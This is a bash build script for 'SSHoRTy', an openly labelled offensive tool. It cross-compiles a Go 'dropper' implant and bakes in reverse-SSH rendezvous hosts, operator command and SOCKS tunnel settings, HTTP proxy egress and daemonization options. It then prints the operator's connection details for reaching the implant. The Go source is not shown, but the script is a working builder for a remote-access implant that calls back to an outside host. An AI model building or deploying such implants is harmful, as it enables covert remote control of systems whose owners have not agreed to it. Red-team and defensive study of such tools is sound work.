#!/bin/bash

usage(){
    echo "Error: $2\n"
    echo "Usage: $1 [build.profileprofile]\n"
    exit 1
}

if [[ $# -eq 0 ]]
then
    BUILDCONF="./build.profile"
else
    BUILDCONF=${1}
fi

if [[ -f  ${BUILDCONF} ]]
then
    source ${BUILDCONF}
else
    usage $0 "Cannot find build configuration"
fi


#------------------------- Build --------------------#
export GOOS=${DropperOS} GOARCH=${DropperArch}

echo "[*] Building dropper for ${DropperOS} / ${DropperArch} "

go build -ldflags \
	"-s -w \
     -X main.SSHShell=${SSHShell}  \
     -X main.SSHEnvTerm=${SSHEnvTerm}  \
     -X main.SSHServerPort=${SSHServerPort}  \
     -X main.SSHServerHost=${SSHServerHost} \
     -X main.SSHServerUser=${SSHServerUser} \
     -X main.SSHServerUserKey=${SSHServerUserKey} \
     -X main.SSHServerUserKeyUrl=${SSHServerUserKeyUrl} \
     -X main.SSHServerUserKeyPassphrase=${SSHServerUserKeyPassphrase} \
     -X main.SSHRemoteCmdHost=${SSHRemoteCmdHost}  \
     -X main.SSHRemoteCmdPort=${SSHRemoteCmdPort} \
     -X main.SSHRemoteCmdUser=${SSHRemoteCmdUser} \
     -X main.SSHRemoteCmdPwd=${SSHRemoteCmdPwd} \
     -X main.SSHRemoteSocksHost=${SSHRemoteSocksHost} \
     -X main.SSHRemoteSocksPort=${SSHRemoteSocksPort} \
     -X main.HTTPProxyFromEnvironment=${HTTPProxyFromEnvironment} \
     -X main.HTTPProxy=${HTTPProxy} \
     -X main.HTTPProxyAuthUser=${HTTPProxyAuthUser} \
     -X main.HTTPProxyAuthPass=${HTTPProxyAuthPass} \
     -X main.HTTPEndpoint=${HTTPEndpoint} \
     -X main.WSEndpoint=${WSEndpoint} \
     -X main.LogFile=${LogFile} \
     -X main.PIDFile=${PIDFile}  \
     -X main.Daemonize=${Daemonize}" \
     -o ${DropperName} \
     ./rssh.go  ./types.go ./vars.go ./pty.go ./socksport.go ./keymgmt.go ./traffic.go

if [[ $? -eq 0 ]]
then
    printf "    %s\n" "########### SSHoRTy Implant Generated ############"
    printf "    %s\n" "!!! Record the info below and keep it safe !!!"

    printf "    %s\n" "Implant: ${DropperName} ($(stat -f '%z bytes' ${DropperName}))"

    printf "    \n%s\n" "::: (Yellow/Red) SSH Rendezvous Point :::"
    printf "    %s\n" "SSHServerHost=${SSHServerHost}"
    printf "    %s\n" "SSHServerPort=${SSHServerPort}"
    printf "    %s\n" "SSHServerUser=${SSHServerUser}"

    printf "    \n%s\n" "::: (Yellow/Red) SSH Key Hosting / Embedding :::"
    printf "    %s\n" "+SSHServerUserKeyFile=${SSHServerUserKeyFile}"
    printf "    %s\n" " SSHServerUserKeyUrl=${SSHServerUserKeyUrl}"
    printf "    %s\n" " SSHServerUserKeyPassphrase=${SSHServerUserKeyPassphrase}"

    printf "    \n%s\n" "::: (Red) Operator SSH Tunnel to Implant :::"
    printf "    %s\n" "SSHRemoteCmdHost=${SSHRemoteCmdHost}"
    printf "    %s\n" "SSHRemoteCmdPort=${SSHRemoteCmdPort}"

    printf "    \n%s\n" "::: (Red) Operator SSH Implant Auth :::"
    printf "    %s\n" "SSHRemoteCmdUser=${SSHRemoteCmdUser}"
    printf "    %s\n" "SSHRemoteCmdPwd=${SSHRemoteCmdPwd}"

    printf "    \n%s\n" "::: (Red) Operator SOCKS Tunnel :::"
    printf "    %s\n" "SSHRemoteSocksHost=${SSHRemoteSocksHost}"
    printf "    %s\n" "SSHRemoteSocksPort=${SSHRemoteSocksPort}"

    printf "    \n%s\n" "::: (Blue) Implant Egress HTTP Proxy :::"
    printf "    %s\n" "+HTTP Proxy:(from env?) ${HTTPProxyFromEnvironment} "
    printf "    %s\n" " HTTP Proxy: ${HTTPProxy} "
    printf "    %s\n" " HTTP Proxy AuthUser ${HTTPProxyAuthUser} "
    printf "    %s\n" " HTTP Proxy AuthPass ${HTTPProxyAuthPass+<masked>} "

    printf "    \n%s\n" "::: (Yellow/Red) Implant HTTP/WS/WSS Wrap Endpoints :::"
    printf "    %s\n" "HTTP Endpoint: ${HTTPEndpoint} "
    printf "    %s\n" "WS Endpoint: ${WSEndpoint} "


    printf "    \n%s\n" "::: (Blue) Implant Execution Context :::"
    printf "    %s\n" "Daemonize? ${Daemonize} "
    printf "    %s\n" "PIDFile: ${PIDFile} "
    printf "    %s\n" "LogFile (!! Debug locally !!): ${LogFile} "
    printf "    %s\n" "SSHEnvTerm ${SSHEnvTerm} "
    printf "    %s\n" "SSHShell ${SSHShell} "

    printf "    \n%s\n" "#######################"

    printf "\n    %s\n" "   Usage SSH-RT: ssh ${SSHRemoteCmdUser}@${SSHRemoteCmdHost} -p ${SSHRemoteCmdPort} "
    printf "    %s\n" "   Usage SSH-RTS: browser SOCKS proxy: ${SSHRemoteSocksHost}:${SSHRemoteSocksPort} "
else
    printf "    %s\n" "Build unsuccessful"
    exit 2
fi


# upx --brute ./rssh
# 7.1 vs. 1.7 mb
